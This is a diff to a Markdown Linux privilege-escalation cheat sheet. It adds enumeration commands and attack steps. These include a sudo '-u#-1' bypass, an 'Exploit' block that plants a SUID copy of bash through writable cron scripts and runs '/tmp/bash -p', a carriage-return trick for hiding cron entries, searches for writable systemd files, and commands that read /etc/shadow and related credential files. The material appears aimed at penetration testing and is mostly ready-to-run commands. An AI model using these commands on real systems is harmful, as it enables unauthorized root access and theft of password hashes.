@@ -10,11 +10,11 @@ Gaining knowledge of system to exploit.
 
 |Name|Command|Description|
 |---|---|---|
-|OS infor| <code>(cat /proc/version \|\| uname -a ) 2>/dev/null &#13; cat /etc/os-release 2>/dev/null</code> |Finding version and searching for exploits|
-|Path|`echo $PATH`|Find dir inside PATH that has write permission to hijack libraries or binaries|
-|Environment|`(env \|\| set) 2>/dev/null`||
-|Sudo version|`sudo -V \| grep "Sudo ver" \| grep "1\\.[01234567]\\.[0-9]\\+\\\|1\\.8\\.1[0-9]\\*\\\|1\\.8\\.2[01234567]"`|sudo < v1.28 `sudo -u#-1 /bin/bash`|
-|Dmesg signature verification failed|`dmesg 2>/dev/null \| grep "signature"`||
+|OS infor| (cat /proc/version \|\| uname -a ) 2>/dev/null <br> cat /etc/os-release 2>/dev/null |Finding version and searching for exploits|
+|Path|echo $PATH|Find dir inside PATH that has write permission to hijack libraries or binaries|
+|Environment|(env \|\| set) 2>/dev/null||
+|Sudo version|sudo -V|sudo < v1.28 `sudo -u#-1 /bin/bash`|
+|Dmesg signature verification failed|dmesg 2>/dev/null \| grep "signature"||
 |Enumerate possible defenses|||
 
 ## Docker Breakout
@@ -33,10 +33,44 @@ rpm -qa #Centos
 ```
 ## Scheduled//Cron jobs
 
+Check all scheduled job
+```python
+cat /etc/crontab
+cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+```
+### Cron path
+
+Check any cron with no path or writable.
+```python
+* * * * root check.sh
+* * * * root /home/usr/backup.sh
+```
+**Exploit**
+```python
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/usr/check.sh
+echo 'cp /bin/bash /tmp/bash; chmod +x /tmp/bash' >> /home/usr/backup.sh
+#wait crom job to be executed
+/tmp/bash -p
+```
+
+
+### Invisible cron jobs
+```python
+#This is comment\r* * * * root check.sh
+```
+
 ## Services
 
+Check for writable .service files
+```python
+find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -perm /022 -type f -ls 2>/dev/null
+```
 ## Timers
 
+Check for writable .timer files
+```python
+find /etc/systemd/system /usr/lib/systemd/system -name "*.timer" -perm /022 -type f -ls 2>/dev/null
+```
 ## Containerd (ctr) privilege escalation
 
 ## RunC privilege escalation
@@ -276,6 +310,28 @@ getcap -r 2>/dev/null| grep cap_setuid
 ```
 
 ## ACLs
+
+## Interesting files
+
+|File|Command|
+|---|---|
+|Profiles files|ls -l /etc/profile /etc/profile.d|
+|Passwd/Shadow|cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null <br> cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null|
+|Check Folders may contains interesting info|ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root 2>/dev/null|
+|Writable root file|find / -type f -user root -perm -0002 -ls 2>/dev/null|grep -v '/proc/*'|
+|Hidden file|find / -type f -iname ".*" -ls 2>/dev/null|
+
+Shell files
+```python
+~/.bash_profile # if it exists, read it once when you log in to the shell
+~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
+~/.profile # if it exists, read once if the two above don't exist
+/etc/profile # only read if none of the above exists
+~/.bashrc # if it exists, read it every time you start a new shell
+~/.bash_logout # if it exists, read when the login shell exits
+~/.zlogin #zsh shell
+~/.zshrc #zsh shell
+```
 
 ## NFS no_root_squash/no_all_squash misconfiguration PE
 
